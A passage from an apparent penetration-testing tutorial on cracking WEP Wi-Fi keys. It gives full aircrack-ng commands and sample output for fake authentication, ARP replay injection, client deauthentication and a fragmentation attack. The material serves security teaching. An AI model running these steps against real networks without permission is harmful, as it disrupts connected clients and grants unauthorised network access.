&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3&lt;/span&gt; 0/ &lt;span class="m"&gt;1&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;33792&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31744&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;30976&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; 0/ &lt;span class="m"&gt;1&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;32768&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31488&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31488&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; KEY FOUND! &lt;span class="o"&gt;[&lt;/span&gt; XX:XX:XX:XX:XX &lt;span class="o"&gt;]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Decrypted correctly: 100%&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 class="heading-element" id="case-2-accelerating-arp-replay-wep-active-attack"&gt;&lt;span&gt;30.2 Case 2: Accelerating ARP Replay (WEP Active Attack)&lt;/span&gt;
 &lt;a href="#case-2-accelerating-arp-replay-wep-active-attack" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;In Case 1, we passively captured packets on a busy network to collect enough IVs to eventually crack the WEP key. However, this approach becomes inefficient on a quiet or low-traffic network. To address this, we can trigger the network to generate traffic using an &lt;strong&gt;ARP replay attack&lt;/strong&gt;. This method injects ARP requests, which forces the Access Point to respond, thereby increasing the number of encrypted packets (and IVs) we can collect.&lt;/p&gt;
&lt;p&gt;This is considered an &lt;strong&gt;active attack&lt;/strong&gt; because we are actively injecting packets into the network to provoke responses.&lt;/p&gt;
&lt;p&gt;This approach is effective when at least one client is associated with the access point. Without an active client, this method won’t work.&lt;/p&gt;
&lt;p&gt;First, make sure your wireless adapter is in monitor mode.&lt;/p&gt;
&lt;p&gt;Use the following command to start listening and identify a WEP-encrypted network and its associated clients:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ airodump-ng wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We associate ourselves with the access point so it accepts our injection packets. This is done using the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aireplay-ng -1 &lt;span class="m"&gt;3600&lt;/span&gt; -q &lt;span class="m"&gt;10&lt;/span&gt; -a &amp;lt;target-BSSID&amp;gt; wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Waiting &lt;span class="k"&gt;for&lt;/span&gt; beacon frame &lt;span class="o"&gt;(&lt;/span&gt;BSSID: XX:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; on channel &lt;span class="m"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Authentication successful
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Association successful :-&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;AID: 1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Sending keep-alive packet every &lt;span class="m"&gt;10&lt;/span&gt; seconds...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-1&lt;/code&gt; Fake auth attack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3600&lt;/code&gt; Keep association for 1 hour&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-q 10&lt;/code&gt; Send keep-alive every 10 seconds&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-a&lt;/code&gt; BSSID of the target AP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;strong&gt;BSSID&lt;/strong&gt;, &lt;strong&gt;channel&lt;/strong&gt;, and a client’s MAC address connected to the target network. Once identified, start a targeted packet capture:&lt;/p&gt;
&lt;div class="alert alert-tip"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z"/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;If no clients are currently connected, you won’t be able to perform the ARP replay attack effectively. Consider switching to a different AP or wait until a device connects.&lt;/p&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ airodump-ng --bssid &amp;lt;target-BSSID&amp;gt; -c &amp;lt;channel&amp;gt; -w wep-arp wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Then, in another terminal, send ARP request packets to stimulate traffic:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ aireplay-ng --arpreplay -b &amp;lt;target-BSSID&amp;gt; -h &amp;lt;client-MAC&amp;gt; wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:12 Waiting &lt;span class="k"&gt;for&lt;/span&gt; beacon frame &lt;span class="o"&gt;(&lt;/span&gt;BSSID: XX:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; on channel &lt;span class="m"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:13 Found BSSID &lt;span class="s2"&gt;&amp;#34;XX:XX:XX:XX:XX:XX&amp;#34;&lt;/span&gt; on channel &lt;span class="m"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:14 Using the MAC address of the client: XX:XX:XX:XX:XX:XX
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:15 Sending ARP request packets...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:16 Got ARP request from client XX:XX:XX:XX:XX:XX
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:16 Injecting ARP request to access point
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:17 ARP packet reinjected successfully &lt;span class="o"&gt;(&lt;/span&gt;1/30 sent&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:18 ARP packet reinjected successfully &lt;span class="o"&gt;(&lt;/span&gt;2/30 sent&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:57:19 ARP packet reinjected successfully &lt;span class="o"&gt;(&lt;/span&gt;3/30 sent&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-b&lt;/code&gt; BSSID of the target access point.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; MAC address of the associated client.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should start seeing a significant increase in the number of captured data packets in your &lt;code&gt;airodump-ng&lt;/code&gt; session.&lt;/p&gt;
&lt;p&gt;Once you’ve captured enough IVs (typically 10,000+), attempt to crack the key using:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ aircrack-ng wep-arp.cap&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;If successful, the WEP key will be displayed, allowing access to the network.&lt;/p&gt;
&lt;div class="alert alert-tip"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z"/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;If you don&amp;rsquo;t see packets increasing, try sending a few deauth packets to refresh the client&amp;rsquo;s connection:&lt;/p&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ aireplay-ng --deauth &lt;span class="m"&gt;5&lt;/span&gt; -a &amp;lt;target-BSSID&amp;gt; -c &amp;lt;client-MAC&amp;gt; wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:44 Waiting &lt;span class="k"&gt;for&lt;/span&gt; beacon frame &lt;span class="o"&gt;(&lt;/span&gt;BSSID: XX:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; on channel &lt;span class="m"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:45 Sending DeAuth to station -- STMAC: &lt;span class="o"&gt;[&lt;/span&gt;XX:XX:XX:XX:XX:XX&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:45 DeAuth packet sent 1/5
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:46 DeAuth packet sent 2/5
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:47 DeAuth packet sent 3/5
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:48 DeAuth packet sent 4/5
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;18:55:49 DeAuth packet sent 5/5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;At the end of the process, remember to disable monitor mode and switch your adapter back to managed mode&lt;/p&gt;
&lt;h3 class="heading-element" id="case-3-fragmentation-attack-authentication-wep-active-advanced-attack"&gt;&lt;span&gt;30.3 Case 3: Fragmentation Attack Authentication (WEP Active Advanced Attack)&lt;/span&gt;
 &lt;a href="#case-3-fragmentation-attack-authentication-wep-active-advanced-attack" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;In the first two cases, we focused on capturing packets either passively or actively by accelerating traffic through ARP replay attacks. Both techniques depend on the presence of at least one client connected to the WEP network to generate sufficient encrypted traffic. But what if the network is quiet, or no clients are connected? In such scenarios, traditional ARP replay attacks fail because there is no traffic to capture or stimulate.&lt;/p&gt;
&lt;p&gt;This third case explores an advanced attack combining &lt;strong&gt;fragmentation&lt;/strong&gt; and &lt;strong&gt;fake authentication&lt;/strong&gt; techniques. Fragmentation attacks exploit how WEP handles small packet fragments, allowing us to recover a portion of the keystream without needing the full data packet. Once the keystream is recovered, it is possible to forge a valid encrypted packet — typically an ARP request — which can then be injected into the network. This injection triggers the Access Point to respond and generate new encrypted packets with fresh Initialization Vectors (IVs).&lt;/p&gt;
&lt;p&gt;The beauty of this method is that it works even on idle networks without any active clients, filling the gap left by the previous techniques. It highlights a critical weakness in WEP’s design and makes cracking such networks feasible.&lt;/p&gt;
&lt;p&gt;To start, you first need to put your wireless adapter into monitor mode, enabling packet capture and injection on the wireless channel:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airmon-ng start wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Next, scan for WEP-enabled Access Points in range:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airodump-ng wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Identify your target by its BSSID and operating channel. Once identified, begin capturing packets specifically from this AP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airodump-ng --bssid &amp;lt;BSSID&amp;gt; -c &amp;lt;channel&amp;gt; -w wep_frag wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Since you have no legitimate client to associate with, perform a fake authentication to trick the AP into accepting your injections:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aireplay-ng -1 &lt;span class="m"&gt;0&lt;/span&gt; -a &amp;lt;BSSID&amp;gt; -h &amp;lt;fake-MAC&amp;gt; wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This creates a fake association that allows packet injection.
Now, launch the fragmentation attack to recover a partial keystream by exploiting small packet fragments sent by the AP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aireplay-ng -5 -b &amp;lt;BSSID&amp;gt; -h &amp;lt;fake-MAC&amp;gt; wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Once a keystream is extracted, forge an encrypted ARP request packet using the recovered keystream. This forged packet will be used to inject traffic and stimulate the network:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
